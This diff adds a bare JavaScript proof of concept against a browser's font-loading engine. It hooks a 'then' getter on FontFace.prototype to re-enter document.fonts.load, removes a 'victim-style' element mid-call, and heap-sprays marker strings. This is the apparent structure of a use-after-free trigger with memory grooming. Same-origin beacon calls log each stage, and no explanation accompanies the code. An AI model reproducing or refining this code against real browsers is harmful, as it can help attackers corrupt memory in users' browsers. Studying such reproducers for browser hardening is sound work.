@@ -1,0 +1,62 @@
+
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+(function(){
+  function run() {
+    b('F155X-START');
+
+    var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+
+    var st = document.createElement('style');
+    st.id = 'victim-style';
+    st.textContent = "@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }";
+    document.head.appendChild(st);
+    b('F155X-SETUP');
+
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function(){
+        if (fired) return undefined;
+        fired = true;
+        b('F155X-GETTER-ENTER');
+        var v = document.getElementById('victim-style');
+        if (v) { v.remove(); b('F155X-STYLE-REMOVED'); }
+        document.body.offsetHeight;
+        b('F155X-LAYOUT-DONE');
+        var spray = [];
+        for (var i = 0; i < 2000; i++) {
+          var arr = new Array(128).fill("\u0000");
+          arr[64] = "\u4141";
+          spray.push(arr.join(""));
+        }
+        b('F155X-SPRAYED');
+        var v2 = 'unknown';
+        try { v2 = document.fonts.check('1em x'); } catch (e) { v2 = 'throw'; }
+        b('F155X-CHECK-' + v2);
+        b('F155X-GETTER-RETURN');
+        return undefined;
+      },
+      set: function(){}
+    });
+
+    b('F155X-CALL-LOAD');
+    document.fonts.load('1em a, x', 'AB').then(
+      function(){ b('F155X-RESOLVED'); },
+      function(){ b('F155X-REJECTED'); }
+    );
+
+    setTimeout(function(){
+      b('F155X-FORCE-PRE');
+      var div = document.createElement('div');
+      div.style.fontFamily = 'x';
+      div.textContent = 'TEST';
+      document.body.appendChild(div);
+      var h = div.offsetHeight;
+      b('F155X-FORCE-POST-h' + h);
+    }, 100);
+  }
+  if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+  else document.addEventListener('DOMContentLoaded', run);
+})();
